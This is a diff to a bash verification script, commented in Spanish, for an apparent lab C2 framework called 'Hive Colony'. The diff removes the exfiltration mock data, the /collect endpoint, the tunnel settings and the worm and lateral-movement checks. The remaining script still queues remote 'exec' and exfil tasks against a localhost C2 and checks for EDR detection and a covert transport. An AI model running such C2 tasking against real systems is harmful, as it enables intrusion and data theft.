@@ -1,13 +1,13 @@
 #!/usr/bin/env bash
 # Hive Colony End-to-End Verification
-# Prueba TODO de verdad: agentes, arena, C2, ciclo de tareas (emulación ronda 4)
+# Prueba TODO de verdad: agentes, arena, C2, ciclo de tareas (ronda 6:
+# solo infraestructura real — sin módulos ofensivos ni simulados)
 set -euo pipefail
 
 HIVE_BIN="target/release"
 ARENA_NAME="hive_verify_$(date +%s)"
 C2_PORT=${C2_PORT:-8444}
 C2_URL="http://127.0.0.1:${C2_PORT}"
-LOOT_DIR="/tmp/hive_verify_loot_$$"
 DB_PATH="/tmp/hive_verify_$$.db"
 PID_FILE="/tmp/hive_verify_pids_$$"
 PASS=0
@@ -28,7 +28,7 @@ cleanup() {
     fi
     pkill -f "c2-server.*--port $C2_PORT" 2>/dev/null || true
     rm -f "/dev/shm/${ARENA_NAME}" 2>/dev/null || true
-    rm -rf "$LOOT_DIR" "$DB_PATH"
+    rm -rf "$DB_PATH"
 }
 trap cleanup EXIT
 
@@ -68,7 +68,7 @@ echo ""
 
 # 1. Verificar bins compilados
 info "Paso 0: Verificando binarios compilados..."
-for bin in c2-server queen worker drone honeybee swarm; do
+for bin in c2-server queen worker drone honeybee; do
     if [ ! -f "$HIVE_BIN/$bin" ]; then
         fail "Binario faltante: $HIVE_BIN/$bin"
         info "Ejecutá: cargo build --release -p $bin"
@@ -77,22 +77,10 @@ for bin in c2-server queen worker drone honeybee swarm; do
 done
 pass "Todos los binarios existen en $HIVE_BIN/"
 
-# 2. Preparar mock data para honeybee
-info "Paso 0.5: Preparando datos mock para exfiltración..."
-mkdir -p /tmp/verify_target/Documents /tmp/verify_target/.ssh /tmp/verify_target/.aws /tmp/verify_target/financial_data
-echo 'account,balance,date' > /tmp/verify_target/financial_data/ledger.csv
-echo '1001,1250000,2024-01-15' >> /tmp/verify_target/financial_data/ledger.csv
-echo '1002,3400000,2024-01-14' >> /tmp/verify_target/financial_data/ledger.csv
-echo 'export AWS_KEY=AKIA123456789' > /tmp/verify_target/.aws/credentials
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' > /tmp/verify_target/.ssh/id_rsa
-echo '<?php $dbpass="pass123"; ?>' > /tmp/verify_target/Documents/config.php
-pass "Datos mock listos en /tmp/verify_target/"
-
 # 3. Iniciar C2 Server
 info "Paso 1: Iniciando C2 Server..."
-rm -rf "$LOOT_DIR" "$DB_PATH"
-mkdir -p "$LOOT_DIR"
-setsid "$HIVE_BIN/c2-server" --port "$C2_PORT" --loot-dir "$LOOT_DIR" --db-path "$DB_PATH" \
+rm -rf "$DB_PATH"
+setsid "$HIVE_BIN/c2-server" --port "$C2_PORT" --db-path "$DB_PATH" \
     < /dev/null > /tmp/hive_verify_c2.log 2>&1 &
 C2_PID=$!
 echo "$C2_PID" > "$PID_FILE"
@@ -136,19 +124,7 @@ else
     fail "C2 endpoint /beacon (respuesta: $BEACON)"
 fi
 
-# 4c. Collect
-COLLECT=$(curl -sf -X POST "$C2_URL/collect" \
-    -H "X-Agent-ID: verify-honeybee-001" \
-    -H "X-Agent-Role: honeybee" \
-    -H "X-File-Name: verify_test.txt" \
-    -d "HIVE_VERIFY_DATA_$(date +%s)" 2>/dev/null || echo "")
-if echo "$COLLECT" | grep -q "received"; then
-    pass "C2 endpoint /collect"
-else
-    fail "C2 endpoint /collect (respuesta: $COLLECT)"
-fi
-
-# 4d. Task push/pull
+# 4c. Task push/pull (el endpoint de exfiltración /collect fue eliminado en ronda 6)
 TASK_PUSH=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "$C2_URL/task/verify-queen-001" \
     -H "Content-Type: application/json" \
     -d '{"id":"vt1","command":"exec","payload":{"cmd":"id"}}' 2>/dev/null || echo "")
@@ -179,14 +155,12 @@ info "Paso 3: Lanzando colonia (todos los agentes)..."
 export __HIVE_ARENA="$ARENA_NAME"
 export HIVE_LAB_MODE=1
 export RUST_LOG=info
-export HIVE_C2_URL="http://127.0.0.1:${C2_PORT}/collect"
-export HIVE_C2_DNS_DOMAIN="tunnel.example.com"
-export HIVE_C2_ICMP_TARGET="127.0.0.1"
+export HIVE_C2_URL="http://127.0.0.1:${C2_PORT}/beacon"
 export HIVE_TELEMETRY_DIR="/tmp/hive_verify_telemetry"
 
 mkdir -p "$HIVE_TELEMETRY_DIR"
 declare -A AGENT_PIDS
-AGENT_LIST=(queen worker drone honeybee swarm)
+AGENT_LIST=(queen worker drone honeybee)
 
 for agent in "${AGENT_LIST[@]}"; do
     setsid "$HIVE_BIN/$agent" < /dev/null > "/tmp/hive_verify_${agent}.log" 2>&1 &
@@ -227,21 +201,14 @@ wait_for_log "/tmp/hive_verify_worker.log" "ScoutAgent" 15 "Worker: ScoutAgent i
 wait_for_log "/tmp/hive_verify_worker.log" "profile" 30 "Worker: system profile recolectado" || true
 wait_for_log "/tmp/hive_verify_worker.log" "edr" 45 "Worker: detección EDR" || true
 
-# 5c. Drone: stigmergy, propagation decisions
+# 5c. Drone: stigmergy, propuestas de consenso
 info "Paso 5c: Verificando Drone..."
 wait_for_log "/tmp/hive_verify_drone.log" "DroneAgent" 15 "Drone: DroneAgent inicializado" || true
-wait_for_log "/tmp/hive_verify_drone.log" "ShaperAction" 30 "Drone: decisión de propagación" || true
 
-# 5d. Honeybee: file discovery, exfil
+# 5d. Honeybee: consenso + genoma en memoria
 info "Paso 5d: Verificando Honeybee..."
 wait_for_log "/tmp/hive_verify_honeybee.log" "HoarderAgent" 15 "Honeybee: HoarderAgent inicializado" || true
-wait_for_log "/tmp/hive_verify_honeybee.log" "discover" 30 "Honeybee: descubrimiento de archivos" || true
-
-
-# 5f. Swarm: discovery, worm limits
-info "Paso 5f: Verificando Swarm..."
-wait_for_log "/tmp/hive_verify_swarm.log" "WormAgent" 15 "Swarm: WormAgent inicializado" || true
-wait_for_log "/tmp/hive_verify_swarm.log" "discover" 30 "Swarm: descubrimiento de hosts" || true
+wait_for_log "/tmp/hive_verify_honeybee.log" "Phoenix" 30 "Honeybee: genoma phoenix en memoria" || true
 
 # ===== TEST ARENA IPC =====
 info "Paso 6: Verificando IPC inter-agentes..."
@@ -251,46 +218,25 @@ wait_for_log "/tmp/hive_verify_queen.log" "worker" 30 "Queen detecta Worker en a
 wait_for_log "/tmp/hive_verify_queen.log" "drone" 30 "Queen detecta Drone en arena" || true
 wait_for_log "/tmp/hive_verify_queen.log" "honeybee" 30 "Queen detecta Honeybee en arena" || true
 
-# ===== TEST CICLO DE TAREAS (EXFIL SIMULADA) =====
-info "Paso 7: Verificando ciclo de tareas del C2 (exfil simulada, ronda 4)..."
+# ===== TEST CICLO DE TAREAS (RECHAZO DE TAREAS DESTRUCTIVAS) =====
+info "Paso 7: Ciclo de tareas del C2 (ronda 6: exfil/destructivas se RECHAZAN)..."
 
-# Crea una tarea de exfil: el TaskPoller del agente la recoge y responde
-# SIEMPRE simulado (emulation mode, docs/EMULATION.md)
+# Una tarea de exfil debe ser RECHAZADA por el TaskPoller (capacidad eliminada)
 TASK_EXFIL=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "$C2_URL/task/verify-honeybee-001" \
     -H "Content-Type: application/json" \
-    -d '{"id":"vexfil1","command":"exfil","payload":{"path":"/tmp/verify_target/financial_data/ledger.csv","filename":"ledger_exfil.csv"}}' 2>/dev/null || echo "")
+    -d '{"id":"vexfil1","command":"exfil","payload":{"path":"/tmp/x"}}' 2>/dev/null || echo "")
 if [ "$TASK_EXFIL" = "201" ]; then
-    pass "Tarea de exfil (simulada) creada en C2"
+    pass "Tarea destructiva aceptada en cola (el agente la rechazará: 'rejected')"
 else
-    warn "No se pudo crear tarea de exfil (HTTP $TASK_EXFIL)"
+    warn "No se pudo crear tarea de prueba (HTTP $TASK_EXFIL)"
 fi
 
-# ===== TEST C2 LOOT (informativo en modo emulación) =====
-info "Paso 8: Loot del C2 (solo llegan artefactos reales de lab; exfil simulada no escribe)..."
-LOOT_FILES=$(ls "$LOOT_DIR"/verify_test* 2>/dev/null || echo "")
-if [ -n "$LOOT_FILES" ]; then
-    pass "Artefacto de laboratorio en loot: $LOOT_FILES"
-    cat "$LOOT_FILES" 2>/dev/null | head -3 | sed 's/^/    /'
+# ===== TRANSPORTE =====
+info "Paso 9: Transporte del enjambre (WhisperNet + failover multi-canal)..."
+if grep -q "WhisperNet" /tmp/hive_verify_queen.log 2>/dev/null; then
+    pass "Queen: transporte WhisperNet activo en telemetría"
 else
-    info "Sin loot real: la exfil es simulada desde ronda 4 (comportamiento esperado)"
-fi
-
-# ===== TEST MOVIMIENTO LATERAL (emulación) =====
-info "Paso 9: Movimiento lateral (emulación: discover_hosts real, exec/deploy simulados)..."
-
-# SSH es un prerequisito del laboratorio (objetivos SSH del lab)
-if command -v ssh &>/dev/null; then
-    pass "SSH client disponible en el laboratorio"
-else
-    warn "SSH no instalado — lab incompleto (no afecta a la emulación)"
-fi
-
-# La propagación real fue retirada (ronda 2: weaver; ronda 4: deploy SSH).
-# Verificamos que el enjambre sigue Publicando resultados de barrido simulado
-if grep -q "simulated" /tmp/hive_verify_swarm.log 2>/dev/null; then
-    pass "Swarm: eventos de emulación visibles en telemetría"
-else
-    warn "Swarm: sin eventos de emulación en logs (puede que no haya targets)"
+    warn "Queen: sin eventos WhisperNet aún (puede requerir más ciclos)"
 fi
 
 # ===== VERIFICACIÓN FINAL =====
